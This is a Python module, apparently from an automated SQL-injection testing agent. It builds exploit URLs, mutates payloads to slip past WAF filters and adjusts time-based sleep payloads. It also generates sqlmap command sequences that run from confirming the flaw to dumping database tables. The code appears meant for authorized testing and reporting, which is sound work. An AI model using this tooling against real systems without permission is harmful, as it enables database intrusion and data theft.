"""
SQLi Agent Payloads (PURE)

Pure functions for payload generation and URL construction:
- Exploit URL building
- Payload mutation for filter bypass
- SQLMap command generation
- Sleep payload creation
- JSON body manipulation

All functions are PURE: no self, no I/O, no mutation.
"""

import copy
import json
import re
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import urlparse, parse_qs, urlencode

from bugtrace.agents.sqli.types import FILTER_MUTATIONS


# =============================================================================
# URL CONSTRUCTION
# =============================================================================

def get_base_url(url: str) -> str:
    """
    # PURE
    Get base URL without query string.

    Args:
        url: Full URL with possible query string

    Returns:
        URL with scheme, host, and path only
    """
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"


def build_url_with_param(url: str, param: str, value: str) -> str:
    """
    # PURE
    Build URL with specific parameter value.

    Handles query parameters, URL template variables, and path segments:
    1. If param exists in query string -> replace its value
    2. If URL contains template variables (:param, {param}) -> replace them
    3. If path contains numeric/UUID segments -> inject into last one
    4. Fallback: add as new query parameter

    Args:
        url: Original target URL
        param: Parameter name to inject
        value: Value to inject

    Returns:
        Constructed URL with injected value
    """
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    query_params = parse_qs(parsed.query)

    # Case 1: param exists in query string -> standard query param injection
    if param in query_params:
        query_params[param] = [value]
        new_query = urlencode(query_params, doseq=True)
        return f"{base_url}?{new_query}"

    # Case 2: URL contains template variables (:param_name or {param_name})
    path = parsed.path
    template_patterns = [
        (f':{param}', value),
        (f'{{{param}}}', value),
        (f':{param.lstrip(":")}', value),
    ]
    for pattern, replacement in template_patterns:
        if pattern in path:
            new_path = path.replace(pattern, replacement)
            new_base = f"{parsed.scheme}://{parsed.netloc}{new_path}"
            if query_params:
                return f"{new_base}?{urlencode(query_params, doseq=True)}"
            return new_base

    # Case 3: path segment injection - replace numeric/UUID-like segments
    segments = path.split('/')
    injected = False

    for i in range(len(segments) - 1, -1, -1):
        seg = segments[i]
        if not seg:
            continue
        if (seg.isdigit() or
                re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', seg, re.I) or
                (re.match(r'^[a-zA-Z0-9]{2,8}$', seg) and not seg.isalpha())):
            segments[i] = value
            injected = True
            break

    if injected:
        new_path = '/'.join(segments)
        new_base = f"{parsed.scheme}://{parsed.netloc}{new_path}"
        if query_params:
            return f"{new_base}?{urlencode(query_params, doseq=True)}"
        return new_base

    # Fallback: add as new query parameter
    query_params[param] = [value]
    new_query = urlencode(query_params, doseq=True)
    return f"{base_url}?{new_query}"


def build_exploit_url(url: str, param: str, payload: str) -> Tuple[str, str]:
    """
    # PURE
    Build raw and encoded exploit URLs.

    Args:
        url: Target URL
        param: Parameter name
        payload: Injection payload

    Returns:
        (exploit_url_encoded, exploit_url_encoded) tuple
    """
    if not payload:
        return url, url

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]

    query_encoded = urlencode(params, doseq=True)
    exploit_url_encoded = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_encoded}"

    return exploit_url_encoded, exploit_url_encoded


# =============================================================================
# FILTER BYPASS MUTATIONS
# =============================================================================

def mutate_payload_for_filters(payload: str, detected_filters: Set[str]) -> List[str]:
    """
    # PURE
    Generate payload variants that bypass detected filters.

    Args:
        payload: Original payload
        detected_filters: Set of characters/keywords that are filtered

    Returns:
        List of payload variants (includes original)
    """
    if not detected_filters:
        return [payload]

    variants = [payload]

    for filtered_char in detected_filters:
        if filtered_char not in FILTER_MUTATIONS:
            continue
        for mutation in FILTER_MUTATIONS[filtered_char]:
            new_variant = payload.replace(filtered_char, mutation)
            if new_variant not in variants:
                variants.append(new_variant)

    return variants[:10]  # Limit to 10 variants


# =============================================================================
# SLEEP PAYLOADS
# =============================================================================

def create_sleep_payload(payload_template: str, sleep_seconds: int) -> str:
    """
    # PURE
    Create sleep payload with specified duration.

    Args:
        payload_template: Template with sleep function calls
        sleep_seconds: Desired sleep duration

    Returns:
        Payload with adjusted sleep durations
    """
    payload = payload_template
    for old_sleep in ["SLEEP(5)", "SLEEP(10)", "SLEEP(3)"]:
        payload = payload.replace(old_sleep, f"SLEEP({sleep_seconds})")
    for old_sleep in ["pg_sleep(5)", "pg_sleep(10)", "pg_sleep(3)"]:
        payload = payload.replace(old_sleep, f"pg_sleep({sleep_seconds})")
    payload = payload.replace("WAITFOR DELAY '0:0:5'", f"WAITFOR DELAY '0:0:{sleep_seconds}'")
    return payload


def verify_time_correlation(baseline_time: float, short_time: float, long_time: float) -> bool:
    """
    # PURE
    Verify correlation: baseline < short < long with reasonable tolerances.

    Args:
        baseline_time: Response time without injection
        short_time: Response time with short sleep (3s)
        long_time: Response time with long sleep (10s)

    Returns:
        True if times correlate with sleep injection
    """
    return (baseline_time < 2 and
            2 < short_time < 6 and
            8 < long_time < 15 and
            short_time > baseline_time + 2 and
            long_time > short_time + 5)


# =============================================================================
# SQLMAP COMMANDS
# =============================================================================

def build_full_sqlmap_command(
    url: str,
    param: str,
    technique: str,
    cookies: List[Dict] = None,
    headers: Dict[str, str] = None,
    detected_filters: Set[str] = None,
    db_type: Optional[str] = None,
    tamper: Optional[str] = None,
    extra_options: Dict = None,
) -> str:
    """
    # PURE
    Build complete SQLMap command for reproduction.

    Args:
        url: Target URL
        param: Parameter name
        technique: Technique code
        cookies: Session cookies
        headers: Custom headers
        detected_filters: Detected WAF filters
        db_type: Database type hint
        tamper: Tamper script name
        extra_options: Additional SQLMap options

    Returns:
        Multi-line SQLMap command string
    """
    technique_map = {
        "error_based": "E", "boolean_based": "B", "union_based": "U",
        "stacked": "S", "time_based": "T", "oob": "E",
    }
    tech_code = technique_map.get(technique, "BEUS")

    cmd_parts = [
        f"sqlmap -u '{url}'",
        "--batch",
        "--level=2",
        "--risk=2",
        f"-p {param}",
        f"--technique={tech_code}",
    ]

    if db_type:
        cmd_parts.append(f"--dbms={db_type.lower()}")

    # Add tamper scripts
    if tamper:
        cmd_parts.append(f"--tamper={tamper}")
    elif detected_filters:
        suggested_tampers = []
        if " " in detected_filters:
            suggested_tampers.append("space2comment")
        if "'" in detected_filters:
            suggested_tampers.append("apostrophemask")
        if "OR" in detected_filters or "AND" in detected_filters:
            suggested_tampers.append("randomcase")
        if suggested_tampers:
            cmd_parts.append(f"--tamper={','.join(suggested_tampers)}")

    # Add cookies
    if cookies:
        cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
        cmd_parts.append(f"--cookie='{cookie_str}'")

    # Add headers
    if headers:
        for name, value in headers.items():
            cmd_parts.append(f"--header='{name}: {value}'")

    if extra_options:
        for key, value in extra_options.items():
            cmd_parts.append(f"--{key}={value}" if value else f"--{key}")

    return " \\\n  ".join(cmd_parts)


def build_progressive_sqlmap_commands(
    url: str,
    param: str,
    technique: str,
    cookies: List[Dict] = None,
    headers: Dict[str, str] = None,
    detected_filters: Set[str] = None,
    db_type: Optional[str] = None,
) -> List[Dict[str, str]]:
    """
    # PURE
    Build progressive SQLMap commands for exploitation.

    Args:
        url: Target URL
        param: Parameter name
        technique: Technique code
        cookies: Session cookies
        headers: Custom headers
        detected_filters: Detected WAF filters
        db_type: Database type hint

    Returns:
        List of step dicts with step, command, description
    """
    base_cmd = build_full_sqlmap_command(
        url, param, technique, cookies, headers, detected_filters, db_type
    )

    return [
        {
            "step": "1. Confirm vulnerability",
            "command": base_cmd,
            "description": "Verify the SQL injection is exploitable"
        },
        {
            "step": "2. List databases",
            "command": base_cmd + " \\\n  --dbs",
            "description": "Enumerate all databases on the server"
        },
        {
            "step": "3. List tables",
            "command": base_cmd + " \\\n  -D <DATABASE_NAME> --tables",
            "description": "List tables in a specific database"
        },
        {
            "step": "4. List columns",
            "command": base_cmd + " \\\n  -D <DATABASE_NAME> -T <TABLE_NAME> --columns",
            "description": "List columns in a specific table"
        },
        {
            "step": "5. Extract data (CAREFUL!)",
            "command": base_cmd + " \\\n  -D <DATABASE_NAME> -T <TABLE_NAME> --dump",
            "description": "Extract data from a table (use with caution in production)"
        },
    ]


# =============================================================================
# REPRODUCTION STEPS
# =============================================================================

def generate_repro_steps(url: str, param: str, payload: str, curl_cmd: str) -> List[str]:
    """
    # PURE
    Generate step-by-step reproduction instructions.

    Args:
        url: Target URL
        param: Parameter name
        payload: Working payload
        curl_cmd: cURL command

    Returns:
        List of numbered reproduction steps
    """
    return [
        f"1. Navigate to the target: {url}",
        f"2. Locate the parameter `{param}`",
        f"3. Inject the following payload: `{payload}`",
        f"4. Expected observation: Database query execution or error",
        f"5. Alternative: Run the provided cURL command:",
        f"   `{curl_cmd}`"
    ]


# =============================================================================
# JSON FLATTENING
# =============================================================================

def flatten_json(obj: Any, prefix: str = "") -> Dict:
    """
    # PURE
    Flatten nested JSON to dot-notation keys.

    Args:
        obj: JSON object (dict or list)
        prefix: Key prefix for nested items

    Returns:
        Flat dict with dot-notation keys
    """
    if isinstance(obj, dict):
        return _flatten_dict(obj, prefix)
    if isinstance(obj, list):
        return _flatten_list(obj, prefix)
    return {}


def _flatten_dict(obj: Dict, prefix: str) -> Dict:
    """Flatten dictionary to dot-notation keys."""
    items = {}
    for k, v in obj.items():
        new_key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, (dict, list)):
            items.update(flatten_json(v, new_key))
        else:
            items[new_key] = v
    return items


def _flatten_list(obj: List, prefix: str) -> Dict:
    """Flatten list to bracket-notation keys."""
    items = {}
    for i, v in enumerate(obj):
        new_key = f"{prefix}[{i}]"
        if isinstance(v, (dict, list)):
            items.update(flatten_json(v, new_key))
        else:
            items[new_key] = v
    return items


def set_nested_value(obj: Any, key_path: str, value: Any) -> Any:
    """
    # PURE
    Set value in nested structure using dot notation.

    Returns a deep copy with the modified value (no mutation).

    Args:
        obj: Original nested object
        key_path: Dot/bracket notation path (e.g., "user.address[0].city")
        value: Value to set

    Returns:
        New object with value set at path
    """
    obj = copy.deepcopy(obj)
    keys = re.split(r'\.|\[|\]', key_path)
    keys = [k for k in keys if k]

    current = obj
    for i, key in enumerate(keys[:-1]):
        if key.isdigit():
            key = int(key)
        current = current[key]

    final_key = keys[-1]
    if final_key.isdigit():
        final_key = int(final_key)
    current[final_key] = value
    return obj


# =============================================================================
# POST DATA EXTRACTION
# =============================================================================

def extract_post_params(post_data: str) -> List[str]:
    """
    # PURE
    Extract parameter names from POST data.

    Args:
        post_data: Raw POST data (URL-encoded or JSON)

    Returns:
        List of parameter names
    """
    params = []

    # URL-encoded
    if "=" in post_data:
        for pair in post_data.split("&"):
            if "=" in pair:
                params.append(pair.split("=")[0])

    # JSON
    try:
        data = json.loads(post_data)
        if isinstance(data, dict):
            params.extend(data.keys())
    except Exception:
        pass

    return params


# =============================================================================
# BLOCK INDICATORS
# =============================================================================

def has_block_indicators(content: str) -> bool:
    """
    # PURE
    Check if response content contains WAF block indicators.

    Args:
        content: HTTP response body

    Returns:
        True if blocked by WAF
    """
    block_indicators = [
        "blocked", "forbidden", "not allowed", "waf", "firewall",
        "security", "illegal", "invalid character", "attack detected"
    ]
    return any(ind in content.lower() for ind in block_indicators)


__all__ = [
    "get_base_url",
    "build_url_with_param",
    "build_exploit_url",
    "mutate_payload_for_filters",
    "create_sleep_payload",
    "verify_time_correlation",
    "build_full_sqlmap_command",
    "build_progressive_sqlmap_commands",
    "generate_repro_steps",
    "flatten_json",
    "set_nested_value",
    "extract_post_params",
    "has_block_indicators",
]
